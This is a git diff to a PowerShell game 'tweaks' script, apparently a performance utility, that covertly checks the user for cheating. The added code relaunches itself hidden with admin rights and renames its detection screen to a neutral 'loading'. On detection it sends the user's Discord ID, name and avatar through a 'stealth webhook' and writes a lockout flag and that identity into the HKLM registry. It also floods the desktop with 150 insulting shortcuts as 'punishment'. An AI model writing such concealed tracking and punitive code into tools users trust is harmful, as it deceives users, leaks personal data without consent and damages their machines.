@@ -96,7 +96,7 @@ if ($needDownload) {
         $extractedRoot = Join-Path $tempDir 'NarakaTweaks-main'
         $mainScript = Join-Path $extractedRoot 'RatzTweaks.ps1'
         Write-Host 'Launching full RatzTweaks.ps1 from temp folder...'
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$mainScript`" -WindowStyle Hidden"
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mainScript`"" -WindowStyle Hidden
         Stop-Process -Id $PID -Force
     } catch {
         Add-Log "ERROR downloading package: $($_.Exception.Message)"
@@ -118,7 +118,7 @@ if (-not $isAdmin) {
     try {
         $scriptPath = $PSCommandPath
         if (-not $scriptPath) { $scriptPath = Join-Path $PSScriptRoot 'RatzTweaks.ps1' }
-        Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
+        Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" -Verb RunAs -WindowStyle Hidden
         [Console]::WriteLine('RatzTweaks: Elevated instance started. Closing current instance.')
         exit 0
     } catch {
@@ -1924,7 +1924,7 @@ $errorBanner
 </html>
 "@
             }
-            'detection-in-progress' {
+            'loading' {
                 @"
 <!doctype html>
 <html lang='en'>
@@ -1951,7 +1951,7 @@ async function checkStatus() {
       return;
     }
     const text = await response.text();
-    if (text.includes('detection-in-progress')) {
+    if (text.includes('loading')) {
       document.getElementById('status').textContent = 'Still checking...';
       setTimeout(checkStatus, 2000);
     } else {
@@ -2140,43 +2140,93 @@ setTimeout(checkStatus, 2000);
             [Console]::WriteLine('Route:/cheater-found: serving lockout page')
             
             # Send webhook notification (initial detection, not repeat offender)
+            [Console]::WriteLine('Route:/cheater-found: sending webhook notification...')
             try {
                 Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
-                [Console]::WriteLine('Route:/cheater-found: stealth webhook sent')
+                [Console]::WriteLine('Route:/cheater-found: stealth webhook sent successfully')
+                # Give the webhook time to complete
+                Start-Sleep -Seconds 2
             } catch {
                 [Console]::WriteLine("Route:/cheater-found: stealth webhook failed: $($_.Exception.Message)")
             }
             
             # Set registry lockout and cache user info
             try {
+                [Console]::WriteLine('Route:/cheater-found: Setting registry lockout...')
                 $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
+                
+                # Ensure the registry key exists
                 if (-not (Test-Path $lockoutKeyPath)) {
-                    New-Item -Path $lockoutKeyPath -Force | Out-Null
+                    [Console]::WriteLine("Route:/cheater-found: Creating registry key: $lockoutKeyPath")
+                    New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
                 }
-                Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force
+                
+                # Set lockout flag
+                [Console]::WriteLine('Route:/cheater-found: Setting Lockout=1')
+                Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
+                
+                # Verify it was set
+                $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
+                [Console]::WriteLine("Route:/cheater-found: Lockout value verified: $($verifyLockout.Lockout)")
                 
                 # Cache user info for repeat offender notifications
                 if ($global:DiscordUserId) {
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force
+                    [Console]::WriteLine("Route:/cheater-found: Caching UserId: $($global:DiscordUserId)")
+                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
                 }
                 if ($global:DiscordUserName) {
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force
+                    [Console]::WriteLine("Route:/cheater-found: Caching UserName: $($global:DiscordUserName)")
+                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
                 }
                 if ($global:DiscordAvatarUrl) {
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force
+                    [Console]::WriteLine("Route:/cheater-found: Caching AvatarUrl")
+                    Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                 }
                 
-                [Console]::WriteLine('Route:/cheater-found: registry lockout set with cached user info')
+                [Console]::WriteLine('Route:/cheater-found: ✓ Registry lockout set with cached user info')
             } catch {
-                [Console]::WriteLine("Route:/cheater-found: failed to set lockout: $($_.Exception.Message)")
+                [Console]::WriteLine("Route:/cheater-found: ✗ FAILED to set lockout: $($_.Exception.Message)")
+                [Console]::WriteLine("Route:/cheater-found: Exception type: $($_.Exception.GetType().FullName)")
+                [Console]::WriteLine("Route:/cheater-found: Stack trace: $($_.ScriptStackTrace)")
+            }
+            
+            # Create desktop shortcuts as punishment
+            try {
+                [Console]::WriteLine('Route:/cheater-found: creating desktop shortcuts...')
+                $desktop   = [Environment]::GetFolderPath('Desktop')
+                $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
+                $eachCount = 50
+                $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
+                $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
+                $icon      = "$iconDll,2"
+
+                $wsh = New-Object -ComObject WScript.Shell
+
+                foreach ($p in $phrases) {
+                    1..$eachCount | ForEach-Object {
+                        $fileName = '{0} ({1}).lnk' -f $p, $_
+                        $lnkPath  = Join-Path $desktop $fileName
+
+                        $shortcut = $wsh.CreateShortcut($lnkPath)
+                        $shortcut.TargetPath  = $target
+                        $shortcut.IconLocation = $icon
+                        $shortcut.Description = $p
+                        $shortcut.Save()
+                    }
+                }
+
+                [Console]::WriteLine("Route:/cheater-found: Created $($phrases.Count * $eachCount) shortcuts on $desktop")
+            } catch {
+                [Console]::WriteLine("Route:/cheater-found: failed to create shortcuts: $($_.Exception.Message)")
             }
             
             $html = & $getStatusHtml 'cheater-found' $null $null $null
             & $send $ctx 200 'text/html' $html
             
-            # Schedule script termination
+            # Schedule script termination with longer delay to ensure all operations complete
+            [Console]::WriteLine('Route:/cheater-found: scheduling script termination in 10 seconds...')
             Start-Job -ScriptBlock {
-                Start-Sleep -Seconds 5
+                Start-Sleep -Seconds 10
                 Stop-Process -Id $using:PID -Force
             } | Out-Null
             
@@ -2221,35 +2271,54 @@ setTimeout(checkStatus, 2000);
                 [Console]::WriteLine('Route:/main-tweaks (POST) CHEATER DETECTED - initiating lockout')
                 
                 # Send webhook notification
+                [Console]::WriteLine('Route:/main-tweaks: sending webhook notification...')
                 try {
                     Send-StealthWebhook -UserId $global:DiscordUserId -UserName $global:DiscordUserName -AvatarUrl $global:DiscordAvatarUrl
-                    [Console]::WriteLine('Route:/main-tweaks: stealth webhook sent')
+                    [Console]::WriteLine('Route:/main-tweaks: stealth webhook sent successfully')
+                    # Give the webhook time to complete
+                    Start-Sleep -Seconds 2
                 } catch {
                     [Console]::WriteLine("Route:/main-tweaks: stealth webhook failed: $($_.Exception.Message)")
                 }
                 
                 # Set registry lockout and cache user info
                 try {
+                    [Console]::WriteLine('Route:/main-tweaks: Setting registry lockout...')
                     $lockoutKeyPath = 'HKLM:\System\GameConfigStore'
+                    
+                    # Ensure the registry key exists
                     if (-not (Test-Path $lockoutKeyPath)) {
-                        New-Item -Path $lockoutKeyPath -Force | Out-Null
+                        [Console]::WriteLine("Route:/main-tweaks: Creating registry key: $lockoutKeyPath")
+                        New-Item -Path $lockoutKeyPath -Force -ErrorAction Stop | Out-Null
                     }
-                    Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force
+                    
+                    # Set lockout flag
+                    [Console]::WriteLine('Route:/main-tweaks: Setting Lockout=1')
+                    Set-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -Value 1 -Type DWord -Force -ErrorAction Stop
+                    
+                    # Verify it was set
+                    $verifyLockout = Get-ItemProperty -Path $lockoutKeyPath -Name 'Lockout' -ErrorAction SilentlyContinue
+                    [Console]::WriteLine("Route:/main-tweaks: Lockout value verified: $($verifyLockout.Lockout)")
                     
                     # Cache user info for repeat offender notifications
                     if ($global:DiscordUserId) {
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force
+                        [Console]::WriteLine("Route:/main-tweaks: Caching UserId: $($global:DiscordUserId)")
+                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserId' -Value $global:DiscordUserId -Type String -Force -ErrorAction Stop
                     }
                     if ($global:DiscordUserName) {
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force
+                        [Console]::WriteLine("Route:/main-tweaks: Caching UserName: $($global:DiscordUserName)")
+                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedUserName' -Value $global:DiscordUserName -Type String -Force -ErrorAction Stop
                     }
                     if ($global:DiscordAvatarUrl) {
-                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force
+                        [Console]::WriteLine("Route:/main-tweaks: Caching AvatarUrl")
+                        Set-ItemProperty -Path $lockoutKeyPath -Name 'LockedAvatarUrl' -Value $global:DiscordAvatarUrl -Type String -Force -ErrorAction Stop
                     }
                     
-                    [Console]::WriteLine('Route:/main-tweaks: registry lockout set with cached user info')
+                    [Console]::WriteLine('Route:/main-tweaks: ✓ Registry lockout set with cached user info')
                 } catch {
-                    [Console]::WriteLine("Route:/main-tweaks: failed to set lockout: $($_.Exception.Message)")
+                    [Console]::WriteLine("Route:/main-tweaks: ✗ FAILED to set lockout: $($_.Exception.Message)")
+                    [Console]::WriteLine("Route:/main-tweaks: Exception type: $($_.Exception.GetType().FullName)")
+                    [Console]::WriteLine("Route:/main-tweaks: Stack trace: $($_.ScriptStackTrace)")
                 }
                 
                 try {
@@ -2260,24 +2329,25 @@ setTimeout(checkStatus, 2000);
                     $phrases   = @('Cheating is Bad','I Use Micro','I Suck at Video Games')
                     $eachCount = 25                                                 # 25 * 3 = 75
                     $target    = Join-Path $env:WINDIR 'System32\notepad.exe'
-                    $icon      = Join-Path $env:SystemRoot 'System32\shell32.dll' + ',2'
+                    $iconDll   = Join-Path $env:SystemRoot 'System32\shell32.dll'
+                    $icon      = "$iconDll,2"
 
                     $wsh = New-Object -ComObject WScript.Shell
 
                     foreach ($p in $phrases) {
                         1..$eachCount | ForEach-Object {
-                        $fileName = '{0} ({1}).lnk' -f $p, $_
-                        $lnkPath  = Join-Path $desktop $fileName
+                            $fileName = '{0} ({1}).lnk' -f $p, $_
+                            $lnkPath  = Join-Path $desktop $fileName
 
-                        $shortcut = $wsh.CreateShortcut($lnkPath)
-                        $shortcut.TargetPath  = $target
-                        $shortcut.IconLocation = $icon
-                        $shortcut.Description = $p
-                        $shortcut.Save()
+                            $shortcut = $wsh.CreateShortcut($lnkPath)
+                            $shortcut.TargetPath  = $target
+                            $shortcut.IconLocation = $icon
+                            $shortcut.Description = $p
+                            $shortcut.Save()
                         }
                     }
 
-                Write-Host "Created $($phrases.Count * $eachCount) shortcuts on $desktop"
+                    Write-Host "Created $($phrases.Count * $eachCount) shortcuts on $desktop"
                 } catch {
                     [Console]::WriteLine("Route:/main-tweaks: failed to create shortcuts: $($_.Exception.Message)")
                 }
@@ -2285,14 +2355,15 @@ setTimeout(checkStatus, 2000);
                 # Serve the cheater-detected page directly with 200 OK
                 & $send $ctx 200 'text/html' $cheaterHtml
                 
-                # Schedule script termination after a delay to ensure response is sent
+                # Schedule script termination with longer delay to ensure all operations complete
+                [Console]::WriteLine('Route:/main-tweaks: scheduling script termination in 10 seconds...')
                 Start-Job -ScriptBlock {
-                    Start-Sleep -Seconds 3
+                    Start-Sleep -Seconds 10
                     Stop-Process -Id $using:PID -Force
                 } | Out-Null
                 
                 # Keep the listener running briefly to ensure the page loads, but then stop
-                Start-Sleep -Seconds 1
+                Start-Sleep -Seconds 2
                 $listener.Stop()
                 return # Exit the request loop
             }
@@ -2321,7 +2392,7 @@ setTimeout(checkStatus, 2000);
             # Check the state of the background detection job
             if ($detectionJob.State -eq 'Running') {
                 [Console]::WriteLine('Route:/check-detection: job still running. Serving loading page again.')
-                $html = & $getStatusHtml 'detection-in-progress' $null $null $null
+                $html = & $getStatusHtml 'loading' $null $null $null
                 & $send $ctx 200 'text/html' $html
                 continue
             }
@@ -2419,40 +2490,13 @@ setTimeout(checkStatus, 2000);
                                     $authed = $true
                                     $global:DiscordAuthError = $null
                                     
-                                    # Check the state of the background detection job without blocking
-                                    [Console]::WriteLine("OAuth: checking detection job state = $($detectionJob.State)")
-                                    [Console]::WriteLine("OAuth: detection job HasMoreData = $($detectionJob.HasMoreData)")
-                                    if ($detectionJob.State -eq 'Running') {
-                                        [Console]::WriteLine('OAuth: background detection is still running. Showing loading screen.')
-                                        [Console]::WriteLine('OAuth: loading screen will auto-refresh to /check-detection in 3 seconds')
-                                        # Serve a loading page that refreshes
-                                        $html = & $getStatusHtml 'detection-in-progress' $null $null $null
-                                        & $send $ctx 200 'text/html' $html
-                                        continue
-                                    }
-                                    
-                                    # If the job is finished and we haven't retrieved the result yet
-                                    if ($detectionJob.State -eq 'Completed' -and -not (Get-Variable -Name 'DetectionResultRetrieved' -Scope Global -ErrorAction SilentlyContinue)) {
-                                        $global:DetectionTriggered = Receive-Job -Job $detectionJob
-                                        $global:DetectionResultRetrieved = $true
-                                        [Console]::WriteLine("OAuth: background detection result retrieved: $($global:DetectionTriggered)")
-                                    } elseif ($detectionJob.State -eq 'Completed') {
-                                        [Console]::WriteLine("OAuth: background detection result already retrieved: $($global:DetectionTriggered)")
-                                    } else {
-                                        [Console]::WriteLine("OAuth: background detection job is in an unexpected state: $($detectionJob.State). Assuming not detected.")
-                                        $global:DetectionTriggered = $false
-                                        $global:DetectionResultRetrieved = $true
-                                    }
-                                    
-                                    if ($global:DetectionTriggered) {
-                                        [Console]::WriteLine('OAuth: DETECTION POSITIVE - flagging user and redirecting to main page for final handling.')
-                                        # Set the flag and redirect to the main page, where the Start button click will trigger the lockout
-                                        $html = & $getStatusHtml 'start' $null $null $null
-                                        & $send $ctx 200 'text/html' $html
-                                        continue
-                                    } else {
-                                        [Console]::WriteLine('OAuth: detection negative - user clean')
-                                    }
+                                    # Always show loading screen after successful OAuth
+                                    # Let the loading screen's polling mechanism handle detection results
+                                    [Console]::WriteLine("OAuth: authentication successful. Showing loading screen.")
+                                    [Console]::WriteLine("OAuth: detection job state = $($detectionJob.State)")
+                                    $html = & $getStatusHtml 'loading' $null $null $null
+                                    & $send $ctx 200 'text/html' $html
+                                    continue
                                 }
                             } else { [Console]::WriteLine('OAuth: no user info returned') }
                         } else { [Console]::WriteLine('OAuth: token exchange returned no access_token') }
